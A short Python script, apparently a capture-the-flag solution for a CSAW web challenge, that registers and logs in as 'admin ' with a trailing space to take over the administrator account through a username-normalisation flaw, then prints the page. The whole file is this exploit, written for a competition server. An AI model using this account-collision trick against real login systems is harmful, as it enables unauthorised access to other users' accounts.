import requests


s = requests.Session()

data = {"username": "admin ", "password": "AAAA"}

payload = {"username": "admin ", "password": "AAAA"}

r = s.post("http://web.red.csaw.io:5002/register", data=data)


r1 = s.post("http://web.red.csaw.io:5002/login", data=payload)

q1 = s.get("http://web.red.csaw.io:5002/")

print(q1.text)
